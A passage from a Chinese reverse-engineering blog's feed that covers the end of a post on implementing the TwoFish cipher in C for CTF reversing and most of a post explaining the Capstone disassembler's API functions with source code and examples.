(s[<span class="number">0</span>][<span class="number">1</span>])];</span><br><span class="line">    out[<span class="number">2</span>] = q[<span class="number">1</span>][q[<span class="number">1</span>][ q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">1</span>][<span class="number">2</span>])] ^ (s[<span class="number">0</span>][<span class="number">2</span>])];</span><br><span class="line">    out[<span class="number">3</span>] = q[<span class="number">0</span>][q[<span class="number">1</span>][ q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">1</span>][<span class="number">3</span>])] ^ (s[<span class="number">0</span>][<span class="number">3</span>])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">subkey_t</span>* Twofish_generate_subkey(<span class="keyword">key_t</span>* tf_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> k, r, g;</span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = (<span class="keyword">subkey_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">subkey_t</span>));</span><br><span class="line">    k = tf_key-&gt;len/<span class="number">8</span>;                                  <span class="comment">/* k=N/64 */</span></span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;k;++r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Generate subkeys Me and Mo */</span></span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span>    );</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">1</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">2</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">3</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">4</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">5</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">6</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">7</span>);</span><br><span class="line">        </span><br><span class="line">        g=k-r<span class="number">-1</span>;                                        <span class="comment">/* Reverse order */</span></span><br><span class="line">        <span class="comment">/* Generate subkeys S using RS matrix */</span></span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">0</span>] = rsm(r, <span class="number">0x01</span>, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">1</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x56</span>, <span class="number">0x82</span>, <span class="number">0xf3</span>, <span class="number">0x1e</span>, <span class="number">0xc6</span>, <span class="number">0x68</span>, <span class="number">0xe5</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">2</span>] = rsm(r, <span class="number">0x02</span>, <span class="number">0xa1</span>, <span class="number">0xfc</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0xae</span>, <span class="number">0x3d</span>, <span class="number">0x19</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">3</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>, <span class="number">0x03</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_subkey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">key_t</span>* expand_key(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">/* Pad factor */</span></span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">16</span>)       n = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">24</span>)  n = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">32</span>)  n = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = (<span class="keyword">key_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">key_t</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span>* ss = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="comment">/* Do actual padding. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;n; ++g)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            *(ss+g) = *(s+g);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(ss+g) = <span class="number">0x00</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tf_key-&gt;k = ss;</span><br><span class="line">    tf_key-&gt;len=n;</span><br><span class="line">    <span class="keyword">return</span> tf_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> gf(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> c, p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">0x1</span>)</span><br><span class="line">            p ^= x;</span><br><span class="line">        c = x &amp; <span class="number">0x80</span>;</span><br><span class="line">        x &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (c)</span><br><span class="line">            x ^= m;</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>写一个main函数直接调用即可。</p><h2 id="CTF出题变化分析"><a href="#CTF出题变化分析" class="headerlink" title="CTF出题变化分析"></a>CTF出题变化分析</h2><p>TwoFish算法共有三处可发生变化以提高出题难度</p><ol><li>rsm函数，0x14d可替换为其他数字</li><li>Twofish_generate_ext_s_keys函数中gf的参数0x166可替换</li><li>Twofish_mds_mul函数中gf的参数0x166可替换</li></ol><p>对于这类分组加密算法，即使插件没有识别，只要看出相关函数结构，就可以很快确定具体算法，找到可能变化的参数，相应修改解密函数即可</p><p>附件中附上了题目和idb文件供自行分析</p><p>From <a href="https://kabeor.github.io/逆向分析加解密之TwoFish算法/">https://kabeor.github.io/逆向分析加解密之TwoFish算法/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向分析加解密之TwoFish算法&quot;&gt;&lt;a href=&quot;#逆向分析加解密之TwoFish算法&quot; class=&quot;headerlink&quot; title=&quot;逆向分析加解密之TwoFish算法&quot;&gt;&lt;/a&gt;逆向分析加解密之TwoFish算法&lt;/h1&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="TwoFish算法" scheme="https://kabeor.github.io/tags/TwoFish%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(三)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%89)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三)/</id>
    <published>2019-07-22T05:20:08.274Z</published>
    <updated>2019-07-29T04:08:28.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-三"><a href="#Capstone反汇编引擎数据类型及API分析及示例-三" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(三)"></a>Capstone反汇编引擎数据类型及API分析及示例(三)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5772" target="_blank" rel="noopener">https://xz.aliyun.com/t/5772</a></p></blockquote><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-open"><a href="#cs-open" class="headerlink" title="cs_open"></a>cs_open</h3><p><code>cs_err CAPSTONE_API cs_open(cs_arch arch, cs_mode mode, csh *handle);</code></p><p>初始化cs句柄</p><p>参数<br>arch: 架构类型 (CS<em>ARCH</em><em>)<br>mode: 硬件模式. CS<em>MODE</em></em>在cs_mode数据类型中可查<br>handle: 指向句柄, 返回时更新<br>return: 创建成功返回CS_ERR_OK，否则返回cs_err枚举中对应的错误信息</p><p>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_open</span><span class="params">(cs_arch arch, cs_mode mode, csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="keyword">if</span> (!cs_mem_malloc || !cs_mem_calloc || !cs_mem_realloc || !cs_mem_free || !cs_vsnprintf)</span><br><span class="line"><span class="comment">// Error: 使用cs_open()前, 必须使用cs_option(CS_OPT_MEM)进行动态内存管理的初始化</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEMSETUP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arch &lt; CS_ARCH_MAX &amp;&amp; cs_arch_init[arch]) &#123;</span><br><span class="line"><span class="comment">// 验证架构是否使用，方式：架构在枚举中且可初始化</span></span><br><span class="line"><span class="keyword">if</span> (mode &amp; cs_arch_disallowed_mode_mask[arch]) &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_MODE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud = cs_mem_calloc(<span class="number">1</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line"><span class="keyword">if</span> (!ud) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud-&gt;errnum = CS_ERR_OK;</span><br><span class="line">ud-&gt;arch = arch;</span><br><span class="line">ud-&gt;mode = mode;</span><br><span class="line"><span class="comment">// 默认情况指令不打开detail模式</span></span><br><span class="line">ud-&gt;detail = CS_OPT_OFF;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认skipdata设置</span></span><br><span class="line">ud-&gt;skipdata_setup.mnemonic = SKIPDATA_MNEM;</span><br><span class="line"></span><br><span class="line">err = cs_arch_init[ud-&gt;arch](ud);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*handle = (<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，cs_struct结构体包含更多细节设定，如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line">Printer_t printer;<span class="comment">// 打印asm</span></span><br><span class="line"><span class="keyword">void</span> *printer_info; <span class="comment">// 打印信息</span></span><br><span class="line">Disasm_t disasm;<span class="comment">// 反编译</span></span><br><span class="line"><span class="keyword">void</span> *getinsn_info; <span class="comment">// 打印辅助信息</span></span><br><span class="line">GetName_t reg_name;</span><br><span class="line">GetName_t insn_name;</span><br><span class="line">GetName_t group_name;</span><br><span class="line">GetID_t insn_id;</span><br><span class="line">PostPrinter_t post_printer;</span><br><span class="line">cs_err errnum;</span><br><span class="line">ARM_ITStatus ITBlock;<span class="comment">// ARM特殊选项</span></span><br><span class="line">cs_opt_value detail, imm_unsigned;</span><br><span class="line"><span class="keyword">int</span> syntax;<span class="comment">//ARM, Mips &amp; PPC等架构的基本asm语法打印</span></span><br><span class="line"><span class="keyword">bool</span> doing_mem;<span class="comment">// 在InstPrinter代码中处理内存操作数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> *insn_cache;<span class="comment">//为mapping.c建立缓存索引</span></span><br><span class="line">GetRegisterName_t get_regname;</span><br><span class="line"><span class="keyword">bool</span> skipdata;<span class="comment">// 如果反编译时要跳过数据，该项设置为True</span></span><br><span class="line"><span class="keyword">uint8_t</span> skipdata_size;<span class="comment">//要跳过bytes的数量</span></span><br><span class="line">cs_opt_skipdata skipdata_setup;<span class="comment">// 自定义skipdata设置</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *regsize_map;<span class="comment">//映射register大小 (目前仅支持x86)</span></span><br><span class="line">GetRegisterAccess_t reg_access;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">mnem_list</span>;</span><span class="comment">// 自定义指令助记符的链接list</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>示例(创建一个x86_64类型的cs句柄)：<br><code>cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)</code></p><h3 id="cs-close"><a href="#cs-close" class="headerlink" title="cs_close"></a>cs_close</h3><p><code>cs_err CAPSTONE_API cs_close(csh *handle);</code></p><p>释放句柄<br>参数<br>handle: 指向一个cs_open()打开的句柄<br>return: 释放成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现代码，可以看出释放句柄实质为将句柄值设置为0</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_close</span><span class="params">(csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">next</span>, *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*handle == <span class="number">0</span>)</span><br><span class="line"><span class="comment">// 句柄不可用</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line">ud = (struct cs_struct *)(*handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ud-&gt;printer_info)</span><br><span class="line">cs_mem_free(ud-&gt;printer_info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放自定义助记符的链接list</span></span><br><span class="line">tmp = ud-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line">next = tmp-&gt;next;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line">tmp = next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(ud-&gt;insn_cache);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ud, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle值设置为0，保证这个句柄在cs_close()释放后不可使用</span></span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br><code>cs_close(&amp;handle);</code></p><h3 id="cs-option"><a href="#cs-option" class="headerlink" title="cs_option"></a>cs_option</h3><p><code>cs_err CAPSTONE_API cs_option(csh handle, cs_opt_type type, size_t value);</code></p><p>反编译引擎的运行时选项</p><p>handle: cs_open()打开的句柄<br>type: 设置选项的类型<br>value: 与type对应的选项值<br>return: 设置成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>注意: 在CS_OPT_MEM的情况下，handle可以是任何值，因此cs_option(handle, CS_OPT_MEM, value)必须在cs_open()之前被调用</p><p>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_option</span><span class="params">(csh ud, cs_opt_type type, <span class="keyword">size_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">cs_opt_mnem *opt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持在所有API前支持 (even cs_open())</span></span><br><span class="line"><span class="keyword">if</span> (type == CS_OPT_MEM) &#123;</span><br><span class="line">cs_opt_mem *mem = (cs_opt_mem *)value;</span><br><span class="line"></span><br><span class="line">cs_mem_malloc = mem-&gt;<span class="built_in">malloc</span>;</span><br><span class="line">cs_mem_calloc = mem-&gt;<span class="built_in">calloc</span>;</span><br><span class="line">cs_mem_realloc = mem-&gt;<span class="built_in">realloc</span>;</span><br><span class="line">cs_mem_free = mem-&gt;<span class="built_in">free</span>;</span><br><span class="line">cs_vsnprintf = mem-&gt;vsnprintf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle)</span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_UNSIGNED:</span><br><span class="line">handle-&gt;imm_unsigned = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_DETAIL:</span><br><span class="line">handle-&gt;detail = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA:</span><br><span class="line">handle-&gt;skipdata = (value == CS_OPT_ON);</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata) &#123;</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_size == <span class="number">0</span>) &#123;</span><br><span class="line">handle-&gt;skipdata_size = skipdata_size(handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA_SETUP:</span><br><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">handle-&gt;skipdata_setup = *((cs_opt_skipdata *)value);</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MNEMONIC:</span><br><span class="line">opt = (cs_opt_mnem *)value;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;id) &#123;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;mnemonic) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加新指令或替换现有指令</span></span><br><span class="line"><span class="comment">// 查看当前insn释放在list中</span></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// f找到指令，替换助记符</span></span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 如果没有就添加这条指令</span></span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line">tmp = cs_mem_malloc(<span class="keyword">sizeof</span>(*tmp));</span><br><span class="line">tmp-&gt;insn.id = opt-&gt;id;</span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="comment">// 新指令放在list最前面</span></span><br><span class="line">tmp-&gt;next = handle-&gt;mnem_list;</span><br><span class="line">handle-&gt;mnem_list = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct insn_mnem *prev, *tmp;</span><br><span class="line"></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line">prev = tmp;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// 删除指令</span></span><br><span class="line"><span class="keyword">if</span> (tmp == prev) &#123;</span><br><span class="line">handle-&gt;mnem_list = tmp-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">prev-&gt;next = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">prev = tmp;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MODE:</span><br><span class="line"><span class="comment">// 验证所请求的模式是否有效</span></span><br><span class="line"><span class="keyword">if</span> (value &amp; cs_arch_disallowed_mode_mask[handle-&gt;arch]) &#123;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OPTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_arch_option[handle-&gt;arch](handle, type, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，更改反汇编后显示的语法：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT);  <span class="comment">// 以AT&amp;T语法显示</span></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出</p><p><img src="https://i.loli.net/2019/07/22/5d35b1e72c20515640.jpg" alt></p><h3 id="cs-errno"><a href="#cs-errno" class="headerlink" title="cs_errno"></a>cs_errno</h3><p><code>cs_err CAPSTONE_API cs_errno(csh handle);</code></p><p>API出错时返回错误消息<br>参数<br>handle: cs_open()打开的句柄<br>return: 无错误返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现很简单，判断到句柄不存在直接返回CS_ERR_CSH</p><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_errno(handle);    <span class="comment">//关闭句柄后检查将报错</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，错误码4即CS_ERR_CSH<br><img src="https://i.loli.net/2019/07/22/5d35bad79c9c384228.jpg" alt></p><h3 id="cs-strerror"><a href="#cs-strerror" class="headerlink" title="cs_strerror"></a>cs_strerror</h3><p><code>const char * CAPSTONE_API cs_strerror(cs_err 